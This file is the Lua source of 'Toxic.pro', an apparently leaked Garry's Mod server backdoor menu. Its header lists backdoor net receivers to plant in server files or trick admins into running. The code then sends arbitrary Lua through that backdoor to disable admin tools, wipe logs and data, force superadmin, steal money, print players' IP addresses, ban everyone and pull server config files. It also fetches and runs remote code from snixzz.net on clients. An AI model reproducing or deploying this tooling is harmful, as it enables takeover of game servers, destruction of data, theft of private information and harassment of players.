/* 

COPYRIGHT 2018

YOU HAVE NO RIGHTS TO REDISTRIBUTE THIS FILE OR ANY FILES ASSOCIATED

YOU MAY NOT COPY AND PASTE THIS SCRIPT 
                                                                                              p.s. lua run does not work
Coded by Hayden Massey (ToxicRiver) @ toxicpro.xyz  (what a fucking joke)

*/

/*
	
	Toxic.pro
	
	Commissioned by 0xymoron for ToxicRiver
	
	Start Date: December 27th, 2017.
	
	First revision finished December 28th, 2017 @ 3:28AM.
	
	January 2nd, 2017 @ 6:27AM
	- This script truly has become toxic, ironic. 
	
*/

/*

-- Possible backdoor strings to plant in a file or convince a superadmin to luarun

util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() RunString( str ) end )
util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() CompileString( str, "[C]", false ) end )
util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() RunStringEx( str ) end )

*/

/*

	metastruct editor read shit
	
	self.HTMLIDE:AddFunction("gmodinterface","OnCode",function(code) ... end)"

	https://github.com/Earu/EasyChat/blob/master/lua/easychat/modules/lua_tab.lua#L140

*/

local toxic = {}

toxic.Net = "nostrip" -- backdoored net message

toxic.Version = "1.2b-leak"

toxic.Aids = {

	"kill them with buttons",
	"you are the admen now",
	"odium copy paste!!!11!1",
	"tricking dumb admens since 2k17",
	"what servers can i use this on???",
	"#1 in backdoor 2k17 e-peen contest",
	"leaked on release day™",
	"here come the hax",
	"leaked by homeless meme",
	
}

/*
	
	Backend functions
	
*/

function toxic.Init()

	if !file.IsDir( "toxic.pro", "DATA" ) then file.CreateDir( "toxic.pro" ) end
	
	if !file.IsDir( "toxic.pro/files", "DATA" ) then file.CreateDir( "toxic.pro/files" ) end

	if !file.IsDir( "toxic.pro/files/lua", "DATA" ) then file.CreateDir( "toxic.pro/files/lua" ) end
	
end

function toxic.Track()

	-- TODO: php tracking & shit

end

function toxic.PostLua( str )

	net.Start( toxic.Net )
	
		net.WriteString( str )
		
	net.SendToServer()

end

function toxic.Notify( msg )

	chat.AddText( Color( 255, 0, 0 ), "[Toxic.pro] ", color_white, msg )

end

/*
	
	user interface
	
*/

function toxic.AddButton( name, parent, func )

	local button = parent:Add( "DButton" )
	button:SetText( "" )
	button:Dock( TOP )
	button:DockMargin( 0, 0, 0, 5 )
	button:SetSize( 100, 25 )
	button.DoClick = func
	
	button.Paint = function( self )
	
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 0, 0, 0, 200 ) )
		
		draw.SimpleText( name, "DebugFixed", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1 )
	
	end

	toxic.ButtonPos = toxic.ButtonPos + 30
	
end

function toxic.AddCategorySpacer( name, col, parent )

	toxic.ButtonPos = toxic.ButtonPos + 5
	
	local button = parent:Add( "DButton" )
	button:SetText( "" )
	button:Dock( TOP )
	button:DockMargin( 0, 0, 0, 5 )
	button:SetSize( 100, 25 )
	button:SetEnabled( false )
	
	button.Paint = function( self )
	
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( col.r, col.g, col.b, 200 ) )
		
		draw.SimpleText( name, "DebugFixed", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1 )
	
	end	

	toxic.ButtonPos = toxic.ButtonPos + 35

end 

function toxic.OpenTextDocument( path, str, parent )
				
	local hostname = string.gsub( GetHostName(), "%W", "" )			
				
	toxic.Notify( "Received file " .. path )

	local frame = vgui.Create( "DFrame" )
	frame:SetSize( ScrW() - ( parent:GetWide() + 75 ), ScrH() - 50 )
	frame:SetPos( parent:GetWide() + 50, 25 )
	frame:SetTitle( GetHostName() .. "'s " .. path )
	frame:MakePopup()
	frame:ShowCloseButton( false )
	frame:SetDraggable( false )

	frame.Paint = function( self )
						
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 140, 0, 0, 150 ) )
						
		draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
						
	end 
	
	local close = vgui.Create( "DButton", frame )
	close:SetSize( 50, 20 )
	close:SetPos( frame:GetWide() - close:GetWide(), 0 )
	close:SetText( "x" )
	close:SetTextColor( Color( 255, 255, 255 ) )
	close:SetFont( "DebugFixed" )
					
	close.Paint = function()
					
		draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
					
	end
					
	close.DoClick = function()
							
		frame:Close()
						
	end
					
	local html = vgui.Create( "DHTML", frame )
	html:SetPos( 5, 30 )
	html:SetSize( frame:GetWide() - 10, frame:GetTall() - 35 )
	html:OpenURL( "https://metastruct.github.io/lua_editor/" )
					
	html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( str ) .. "' )" )

	local save = vgui.Create( "DButton", frame )
	save:SetSize( 60, 20 )
	save:SetPos( frame:GetWide() - close:GetWide() - save:GetWide() - 5, 0 )
	save:SetText( "Save As" )
	save:SetTextColor( Color( 255, 255, 255 ) )
	save:SetFont( "DebugFixed" )
					
	save.Paint = function()
					
		draw.RoundedBox( 0, 0, 0, save:GetWide(), save:GetTall(), Color( 62, 168, 62, 255 ) )
					
	end
					
	save.DoClick = function()
					
		Derma_StringRequest( "Save file '" .. path .. "' to data/toxic.pro/files/" .. hostname .. "/", "File name (e.g: servercfg or servercfg.txt)", "", function( text ) 
				
			if !string.find( text, ".txt" ) then text = text .. ".txt" end
				
			if !file.IsDir( "toxic.pro/files/" .. hostname, "DATA" ) then file.CreateDir( "toxic.pro/files/" .. hostname ) end			
				
			file.Write( "toxic.pro/files/" ..  hostname .. "/" .. text, str )
				
			toxic.Notify( "Saved source to data/toxic.pro/files/" .. hostname .. "/" .. text )
			
		end )
						
	end	
	
end

toxic.LuaStr = ""

function toxic.OpenLuaEditor( parent )

	local frame = vgui.Create( "DFrame" )
	frame:SetSize( ScrW() - ( parent:GetWide() + 75 ), ScrH() - 50 )
	frame:SetPos( parent:GetWide() + 50, 25 )
	frame:SetTitle( "" )
	frame:MakePopup()
	frame:ShowCloseButton( false )
	frame:SetDraggable( false )

	frame.Paint = function( self )
						
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 140, 0, 0, 150 ) )
						
		draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
						
	end 
	
	local close = vgui.Create( "DButton", frame )
	close:SetSize( 50, 20 )
	close:SetPos( frame:GetWide() - close:GetWide(), 0 )
	close:SetText( "x" )
	close:SetTextColor( Color( 255, 255, 255 ) )
	close:SetFont( "DebugFixed" )
					
	close.Paint = function()
					
		draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
					
	end
					
	close.DoClick = function()	
		
		frame:Close()
						
	end
					
	local html = vgui.Create( "DHTML", frame )
	html:SetPos( 5, 30 )
	html:SetSize( frame:GetWide() - 10, frame:GetTall() - 35 )
	html:OpenURL( "https://metastruct.github.io/lua_editor/" )
					
	html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( toxic.LuaStr ) .. "' )" )
			
	html:AddFunction( "gmodinterface", "OnCode", function( code ) -- thanks easychat
	
		toxic.LuaStr = code
	
	end )
	
	local run = vgui.Create( "DButton", frame )
	run:SetSize( 60, 20 )
	run:SetPos( 0, 0 )
	run:SetText( "Run" )
	run:SetTextColor( Color( 255, 255, 255 ) )
	run:SetFont( "DebugFixed" )
					
	run.Paint = function( self )
					
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 62, 168, 255 ) )
					
	end
					
	run.DoClick = function()
					
		local options = DermaMenu()
		
		options:AddOption( "Server", function()
			
			toxic.PostLua( toxic.LuaStr )
			
			toxic.Notify( "Ran Lua on server" )
			
		end ):SetImage( "icon16/server.png" )
		
		options:AddOption( "All Clients", function()
			
			toxic.PostLua( [[
			
				for k, v in next, player.GetAll() do
				
					v:SendLua( ']] .. toxic.LuaStr .. [[' )
				
				end
			
			]] )
			
			toxic.Notify( "Ran Lua on all clients" )
			
		end ):SetImage( "icon16/computer_add.png" )
		
		local players, menu = options:AddSubMenu( "Client" )
		
		menu:SetIcon( "icon16/user.png" )
		
		for k, v in next, player.GetAll() do
		
			players:AddOption( v:Nick(), function()
			
				local id = v:UserID()
				
				toxic.PostLua( [[
				
					local id = ]] .. id .. [[
					
					Player( id ):SendLua( ']] .. toxic.LuaStr .. [[' )
				
				]] )
				
				toxic.Notify( "Ran Lua on " .. v:Nick() )
			
			end )
		
		end
		
		options:Open()
		
	end	
	
	local save = vgui.Create( "DButton", frame )
	save:SetSize( 60, 20 )
	save:SetPos( run:GetWide() + 5, 0 )
	save:SetText( "Save" )
	save:SetTextColor( Color( 255, 255, 255 ) )
	save:SetFont( "DebugFixed" )
					
	save.Paint = function( self )
					
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 168, 62, 255 ) )
					
	end
	
	save.DoClick = function()
					
		Derma_StringRequest( "Save file to data/toxic.pro/files/lua", "File name (e.g: aimbot or aimbot.txt)", "", function( text ) 
				
			if !string.find( text, ".txt" ) then text = text .. ".txt" end

			file.Write( "toxic.pro/files/lua/" .. text, toxic.LuaStr )
				
			toxic.Notify( "Saved source to data/toxic.pro/files/lua/" .. text )
			
		end )
						
	end	
	
	local load = vgui.Create( "DButton", frame )
	load:SetSize( 60, 20 )
	load:SetPos( run:GetWide() + load:GetWide() + 10, 0 )
	load:SetText( "Load" )
	load:SetTextColor( Color( 255, 255, 255 ) )
	load:SetFont( "DebugFixed" )
					
	load.Paint = function( self )
					
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 168, 148, 62, 255 ) )
					
	end
	
	load.DoClick = function()
	
		local options = DermaMenu()
		
		for k, v in pairs( file.Find( "toxic.pro/files/lua/*.txt", "DATA" ) ) do
		
			options:AddOption( v, function()
				
				local str = file.Read( "toxic.pro/files/lua/" .. v, "DATA" )
				
				MsgN( str )
				
				toxic.LuaStr = str
				
				html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( str ) .. "' )" )
				
				toxic.Notify( "Loaded " .. v )
				
			end )
			
		end
		
		options:Open()
		
	end
	
end

function toxic.UI()
	
	toxic.ButtonPos = 30
	
	local frame = vgui.Create( "DFrame" )
	frame:SetTitle( "Toxic.pro v" .. toxic.Version .. " | by 0xymoron ~ " .. table.Random( toxic.Aids ) )
	frame:SetSize( 550, 400 )
	frame:SetPos( 25, 25 )
	frame:MakePopup()
	frame:ShowCloseButton( false )
	frame:SetDraggable( false )
	
	frame.Paint = function( self )
		
		local hsv = HSVToColor( RealTime() * 120 % 360, 1, 1 )
		
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( hsv.r, hsv.g, hsv.b, 150 ) ) -- old: Color( 140, 0, 0, 150 )
		
		draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
		
		surface.SetFont( "CloseCaption_Bold" )
		
		local str1 = "Toxic.pro Version " .. toxic.Version
			
		local str1_width, str1_height = surface.GetTextSize( str1 )
		
		local str2 = "by 0xymoron"
		
		local str2_width, str2_height = surface.GetTextSize( str2 )
		
		draw.SimpleText( str1, "CloseCaption_Bold", frame:GetWide() / 2 + 2.5, 65, color_white, 1, 1 ) 
		
		draw.SimpleText( str2, "CloseCaption_Bold", frame:GetWide() / 2 + 2.5, frame:GetTall() - str2_height - 25, color_white, 1, 1 ) 
		
	end 
	
	local close = vgui.Create( "DButton", frame )
	close:SetSize( 50, 20 )
	close:SetPos( frame:GetWide() - 50, 0 )
	close:SetText( "x" )
	close:SetTextColor( Color( 255, 255, 255 ) )
	close:SetFont( "DebugFixed" )
	
	close.Paint = function()
	
		draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
	
	end
	
	close.DoClick = function()
		
		frame:Close()
		
	end
	
	local set = vgui.Create( "DButton", frame )
	set:SetSize( 40, 20 )
	set:SetPos( frame:GetWide() - close:GetWide() - set:GetWide() - 5, 0 )
	set:SetText( "Set" )
	set:SetTextColor( Color( 255, 255, 255 ) )
	set:SetFont( "DebugFixed" )
	
	set.Paint = function( self )
	
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 168, 62, 255 ) )
	
	end	
	
	local netmsg = vgui.Create( "DTextEntry", frame )
	netmsg:SetSize( 75, 20 )
	netmsg:SetPos( frame:GetWide() - close:GetWide() - netmsg:GetWide() - set:GetWide() - 10, 0 )
	netmsg:SetText( toxic.Net )
	
	netmsg.OnEnter = function( self )
	
		toxic.Notify( "Set backdoored net message to '" .. netmsg:GetValue() .. "'" )
	
		toxic.Net = self:GetValue()
		
	end
	
	set.DoClick = function( self )
		
		toxic.Net = netmsg:GetValue()
		
		toxic.Notify( "Set backdoored net message to '" .. netmsg:GetValue() .. "'" )
		
	end	
	
	local panel = vgui.Create( "DScrollPanel", frame )
	panel:SetPos( 5, 30 )
	panel:SetSize( 150, frame:GetTall() - 35 )
	
	local html = vgui.Create( "HTML", frame )
	html:SetPos( panel:GetWide() + 20, 95 )
	html:SetSize( 240, 215 )
	html:SetHTML( [[
		<img src="http://www.clker.com/cliparts/c/e/8/f/12387015421849960016GameFreak7744_Biohazard_symbol.svg.med.png" alt="Img" style="width:200px;height:195px;">
	]] )
	
	/**************************************
		
		Player Management
		
	***************************************/
	
	local dlist = vgui.Create( "DListView", frame )
	dlist:SetSize( 140, frame:GetTall() - 35 )
	dlist:SetPos( frame:GetWide() - dlist:GetWide() - 5, 30 )
	dlist:SetMultiSelect( false )
	dlist:AddColumn( "Players" )
	
	for k, v in next, player.GetAll() do
		
		dlist:AddLine( v:Nick() )
	
	end

	dlist.OnClickLine = function( parent, line, self )
		
		for k, v in next, player.GetAll() do
			
			if v:Nick() == line:GetValue( 1 ) then
				
				dlist.SelectedEntity = v
					
			else
			
				continue
				
			end
			
		end
	
	end
	
	dlist.OnRowRightClick = function( parent, line, isselected )
	
		surface.PlaySound( "buttons/button9.wav" )
		
		local id = dlist.SelectedEntity:UserID()
		
		local target = Player( id )
		
		local options = DermaMenu()
		
		options:AddOption( "Kick", function()
			
			toxic.PostLua( [[
			
				Player( ]] .. id .. [[ ):Kick() 
			
			]] )
			
			toxic.Notify( "Kicked " .. target:Nick() )
			
			if dlist then
				
				dlist:RemoveLine( line )
				
			end
			
		end ):SetImage( "icon16/door_out.png" )
		
		options:AddOption( "Silent Slay", function()
			
			toxic.PostLua( [[
			
				Player( ]] .. id .. [[ ):KillSilent() 
			
			]] )
			
			toxic.Notify( "Silently slayed " .. target:Nick() )
			
		end ):SetImage( "icon16/lightning.png" )
		
		options:AddOption( "Freeze", function()
			
			toxic.PostLua( [[
				
				local ply = Player( ]] .. id .. [[ )
				
				ply:Freeze( !ply:IsFrozen() )
			
			]] )
			
			if !target:IsFrozen() then
			
				toxic.Notify( "Froze " .. target:Nick() )
				
			else
			
				toxic.Notify( "Unfroze " .. target:Nick() )
				
			end
			
		end ):SetImage( "icon16/tux.png" )
		
		options:AddOption( "Give Weapon", function()
			
			Derma_StringRequest( "Give " .. target:Nick() .. " a weapon", "What weapon? (example: weapon_ak47)", "", function( text ) 
			
				toxic.PostLua( [[
					
					local str = "]] .. text .. [["
					
					Player( ]] .. id .. [[ ):Give( str )
				
				]] )
		
				toxic.Notify( "Gave " .. target:Nick() .. " a " .. text )
	
			end )
			
		end ):SetImage( "icon16/bomb.png" )
		
		options:AddOption( "Give Money", function()
			
			Derma_StringRequest( "Give " .. target:Nick() .. " money", "How much?", "", function( text ) 
				
				if !isnumber( tonumber( text ) ) then return end
				
				toxic.PostLua( [[
					
					local str = "]] .. text .. [["
					str = tonumber( str )
					
					Player( ]] .. id .. [[ ):addMoney( str )
				
				]] )
		
				toxic.Notify( "Gave " .. target:Nick() .. " $" .. string.Comma( text ) )
	
			end )
			
		end ):SetImage( "icon16/money_add.png" )
		
		options:AddOption( "Inject Toxic.pro", function()
			
			local snd = table.Random( { "vo/npc/male01/herecomehacks01.wav","vo/npc/male01/herecomehacks02.wav" } ) -- stfu
			
			toxic.PostLua( [[		
					
				Player(]] .. id .. [[):SendLua('http.Fetch("http://snixzz.net/toxic.pro/toxic.lua",function(body) RunString(body) surface.PlaySound("]] .. snd .. [[") chat.AddText(Color(255,0,0),"[Toxic.pro] ",color_white,"Welcome, run `toxic.pro` in console") end)')
				
			]] )
		
			toxic.Notify( "Injected Toxic.pro into " .. target:Nick() .. "'s client." )
			
		end ):SetImage( "icon16/bug_add.png" )
		
		options:Open()
		
	end
	
	/**************************************
		
		Buttons
		
	***************************************/
	
	
	toxic.AddCategorySpacer( "Prevention", Color( 255, 0, 0 ), panel )
	
	toxic.AddButton( "Break ULX", panel, function()
	
		toxic.PostLua( [[ _G.ulx = function() end _G.ULib = function() end ]])

		toxic.Notify( "Broke ULX, admins now have no control." )	
	
	end )
	
	toxic.AddButton( "Break FAdmin", panel, function()
	
		toxic.PostLua( [[
		
			_G.FAdmin = function() end
		
		]] )
		
		toxic.Notify( "Killed FAdmin" )
	
	end )
	
	toxic.AddButton( "Wipe Logs", panel, function()
		
		local date = os.date( "%m-%d-%y" )
		
		toxic.PostLua( [[ 
			
			file.Delete( "ulx_logs/]] .. date .. [[.txt" )
		
		]] )
		
		toxic.Notify( "Deleted data/ulx_logs/" .. date .. ".txt" )
	
	end )
	
	toxic.AddButton( "Wipe data/", panel, function()
		
		toxic.PostLua( [[
		
		local id = ]] .. LocalPlayer():UserID() .. [[
		
		local dirs = {
		
			"ulx", 
			"ulx_logs",
			"ulib",
			"darkrp_logs",
			"adv_duplicator",
			"advdupe2",
			"cpuchip",
			"expression2",
			"cw2_0",
		
		}
		
		for k, v in pairs( dirs ) do
			
			for dir, _file in pairs( file.Find( v .. "/*", "DATA" ) ) do
				
				file.Delete( v .. "/" .. _file )
				
				Player( id ):ChatPrint( "[Toxic.pro] Deleted file 'data/" .. v .. "/" .. _file )
			
			end
		
		end
		
		for k, v in pairs( file.Find( "*", "DATA" ) ) do
		
			file.Delete( v )
		
			Player( id ):ChatPrint( "[Toxic.pro] Deleted file 'data/" .. v )
		
		end
		
		]] )
	
	end )
	
	toxic.AddButton( "No Kick/Ban", panel, function()
	
		toxic.PostLua( [[
		
			_R = debug.getregistry()
			
			function game.KickID( id, reason )
			
				return
			
			end
			
			function _R.Player.Ban()
			
				return
			
			end
			
			function _R.Player.Kick()
			
				return
				
			end
		
		]] )
		
		toxic.Notify( "Nulled _R.Player.Ban & _R.Player.Kick" )
	
	end )
	
	toxic.AddButton( "Disable !cake", panel, function()
	
		toxic.PostLua( [[ _G.cac = function() end]] )
		
		toxic.Notify( "Attempted to disable !cake's anti-cheat, probably failed." )
	
	end )
	
	toxic.AddCategorySpacer( "DarkRP", Color( 0, 200, 0 ), panel )
	
	toxic.AddButton( "Steal Money", panel, function()
	
		toxic.PostLua( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[

			for k, v in next, player.GetAll() do
				
				if v:Nick() == "]] .. LocalPlayer():Nick() .. [[" then
				
					continue
				
				end
				
				local bal = v:getDarkRPVar( "money" ) or 9999999
				
				v:addMoney( -bal )
				
				Player( id ):addMoney( bal )
				
				Player( id ):ChatPrint( "[Toxic.pro] Stole $" .. string.Comma( bal ) .. " from " .. v:Nick() )
				
			end
		
		]] )

	end )
	
	toxic.AddButton( "Wipe All Money", panel, function() 
	
		toxic.PostLua( [[RunConsoleCommand( "rp_resetallmoney" )]] )

		toxic.Notify( "Wiped DarkRP money database" ) 
		
	end )
	
	toxic.AddButton( "Change All Names", panel, function()
	
		Derma_StringRequest( "Name Changer", "What would you like to name everyone?", "", function( text ) 
			
			toxic.PostLua( [[
				
				local str = "]] .. text .. [["
				
				for k, v in next, player.GetAll() do
				
					DarkRP.storeRPName( v, str )
					
					v:setDarkRPVar( "rpname", str )
				
				end
			
			]] )
	
			toxic.Notify( "Renamed everyone to '" .. text .. "'" )
	
		end )
	
	end )
	
	toxic.AddButton( "Strip Weapons", panel, function()
	
		for k, v in next, player.GetAll() do
			
			for x, y in pairs( v:GetWeapons() ) do
				
				net.Start( "properties" )
				
					net.WriteString( "remove", 32 )
					
					net.WriteEntity( y )
					
				net.SendToServer()
				
			end
			
		end
	
		toxic.Notify( "Attempted to use net 'properties' exploit to strip all players." )
	
	end )
	
	toxic.AddCategorySpacer( "Autism", Color( 200, 0, 200 ), panel )
	
	toxic.AddButton( "Visual Rape", panel, function()
	
		-- I don't like this.
		toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[sound.PlayURL( 'http://riverrp.xyz/boss.mp3', 'mono', function( s ) s:Play() end )]] ) end" )
	
		-- I don't like any of this.
		toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[http.Fetch( 'https://snixzz.net/toxic.pro/disco.lua', function( body ) RunString( body ) end )]] ) end" )	
	
	end )
	
	toxic.AddButton( "Earthquake", panel, function()

		toxic.PostLua( "for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end" )
		
		toxic.Notify( "Earthquake started." )
		
	end )
	
	toxic.AddButton( "Horse", panel, function()
	
		toxic.PostLua( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			Player( id ):SetModel( "models/props_c17/statue_horse.mdl" )
			
			Player( id ):SetMaterial( "models/debug/debugwhite" )
			
			hook.Add( "Think", "horse", function()
				
				if !IsValid( Player( id ) ) then return end
				
				Player( id ):SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )
			
			end )
		
		]] )
	
	end )
	
	toxic.AddButton( "Footsteps", panel, function()
	
		toxic.PostLua( [[
		
			hook.Add( "PlayerFootstep", "oooh", function( ply ) 
			
				ply:EmitSound( "vo/npc/female01/pain0" .. math.random( 1, 9 ) .. ".wav", 75, math.random( 50, 100 ) )
			
			end )
		
		]] )
		
		toxic.Notify( "Enabled moaning footsteps." )
	
	end )
	
	toxic.AddButton( "Spam .txt", panel, function()
		
		Derma_StringRequest( ".txt file contents", "What would you like to put in the .txt?", "", function( text ) 
			
			toxic.PostLua( [[
		
				for i = 1, 100 do 
			
					file.Write( "toxic.pro_" .. math.random( 1, 999999 ) .. ".txt", "]] .. text .. [[" )
			
				end
			
			]] )
	
			toxic.Notify( "Spamming 100 .txt files containing '" .. text .. "'" )
	
		end )
		
	end )
	
	toxic.AddButton( "Spam Chat", panel, function()
		
		Derma_StringRequest( "Message", "Chat Message", "SEIZED BY TOXIC.PRO", function( text ) 
			
			toxic.PostLua( [[
				
				util.AddNetworkString("chat_AddText")
				chat = {}
				function chat.AddText(...)
					net.Start("chat_AddText")
						net.WriteTable({...})
					net.Broadcast()
				end
				function AddTextPly( ply, ...)
					net.Start("chat_AddText")
						net.WriteTable({...})
					net.Send( ply )
				end
				
				for k, v in pairs( player.GetAll() ) do
				
					v:SendLua( 'net.Receive("chat_AddText", function(len) chat.AddText( unpack( net.ReadTable() ) )end)' )
				
				end
				
				timer.Create( "gotEm", 1, 120, function()
				
					local function ChatPrintRainbow( frequency, str )

						local text = {}


						for i = 1, #str do
							table.insert( text, HSVToColor( i * frequency % 360, 1, 1 ) )
						table.insert( text, string.sub( str, i, i ) )
						end

						chat.AddText( unpack( text ) )

					end
					
					ChatPrintRainbow( 10, "]] .. text .. [[" )
				
				end )

			
			]] )

		end )
		
	end )
	
	/*toxic.AddButton( "Spam Advert", panel, function()
		
		Derma_StringRequest( "Message", "Spam Message", "SEIZED BY TOXIC.PRO", function( text ) 
			
			toxic.PostLua( [[
				
				local id = ]] .. LocalPlayer():UserID() .. [[
				
				local why = ]] .. text .. [[
				
				timer.Create( "gotEm2", 1, 120, function()
				
					for k, v in next, player.GetAll() do
					
						v:SetNWString( "why", why )
					
						v:SendLua( 'RunConsoleCommand("say","/advert",LocalPlayer():GetNWString("why"))')
						
					end
				
				end )

			
			]] )

		end )
		
	end )*/
	
	toxic.AddButton( "Dance", panel, function()

		toxic.PostLua( [[
				
			local id = ]] .. LocalPlayer():UserID() .. [[
				
			timer.Create( "gotEm3?", 1, 120, function()
				
				for k, v in next, player.GetAll() do
					
					if v:UserID() == v then continue end
					
					v:SendLua('RunConsoleCommand("act","dance")')
						
				end
				
			end )

			
		]] )
		
		toxic.Notify( "Forcing all players to run act dance" )
		
	end )
	
	toxic.AddCategorySpacer( "Takeover", Color( 255, 150, 0 ), panel )
	
	toxic.AddButton( "Give Superadmin", panel, function()
		
		toxic.PostLua( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			Player( id ):SetUserGroup( "superadmin" )
		
		]] )
		
		toxic.Notify( "Attempted to silently force superadmin." )
	
	end )
	
	toxic.AddButton( "Print All IPs", panel, function()
		
		toxic.PostLua( [[
		
			local id = ]] .. LocalPlayer():UserID() .. [[
			
			for k, v in pairs( player.GetAll() ) do 
				
				Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )
				
			end

		]] )
		
		toxic.Notify( "Printed all IPs into chat." )
	
	end )
	
	toxic.AddButton( "Ban Everyone", panel, function()
	
		Derma_StringRequest( "Toxic.pro Ban All", "Reason", "", function( text )
		
			toxic.PostLua( [[
		
				local id = ]] .. LocalPlayer():UserID() .. [[
			
				for k, v in next, player.GetAll() do
				
					if v:UserID() == id then continue end
				
					v:Ban( 0, false )
				
					v:Kick( "]] .. tostring( text ) .. [[" )
					
				end
		
			]] )
			
			toxic.Notify( "Banned everyone for '" .. text .. "'" )
			
		end )
	
	end )
	
	toxic.AddButton( "RCON", panel, function()
	
		Derma_StringRequest( "Toxic.pro RCON", "Command", "", function( text ) 
			
			toxic.PostLua( [[game.ConsoleCommand( "]] .. tostring( text ) .. [[" .. "\n" )]] )
			
			toxic.Notify( "Ran command '" .. text .. "'" )
			
		end )
	
	end )
	
	toxic.AddButton( "Lua Run", panel, function()
	
		toxic.OpenLuaEditor( frame )
	
		/*Derma_StringRequest( "Toxic.pro Lua Run", "Lua String", "", function( text ) 
			
			toxic.PostLua( [[RunString( ']] .. text .. [[' )]] )
			
			toxic.Notify( "Ran Lua '" .. text .. "'" )
			
		end )*/
	
	end )
	
	toxic.AddButton( "Rename Server", panel, function() 
	
		toxic.PostLua( [[RunConsoleCommand( "hostname", "TOXIC.PRO" )]] )
		
		toxic.Notify( "Renamed server to TOXIC.PRO" )
	
	end )

	toxic.AddButton( "Steal File", panel, function()
	
		Derma_StringRequest( "Steal File Source", "File Path (Relative to garrysmod/) e.g: cfg/server.cfg", "", function( text ) 		
			
			net.Receive( "file", function( len )
						
				local str = net.ReadString()
									
				if str != "ERROR" then
									
					toxic.OpenTextDocument( text, str, frame )
							
				else
									
					toxic.Notify( "Unable to find file " .. text .. " on the server" )
									
				end
									
			end )
			
			toxic.PostLua( [[
				
				util.AddNetworkString( "file" )
				
				local id = ]] .. LocalPlayer():UserID() .. [[
				
				local f = file.Open( "]] .. text .. [[", "r", "GAME" )
				
				if !f then 
				
					net.Start( "file" )
				
						net.WriteString( "ERROR" )
					
					net.Send( Player( id ) )
				
					return 
					
				end
				
				local str = f:Read( f:Size() )
				
				f:Close()

				net.Start( "file" )
				
					net.WriteString( str )
					
				net.Send( Player( id ) )
			
			]] )
			
			toxic.Notify( "Attempted to steal file " .. text )
			
		end )
		
	end )
	
end

toxic.Init()
concommand.Add( "toxic.pro", toxic.UI )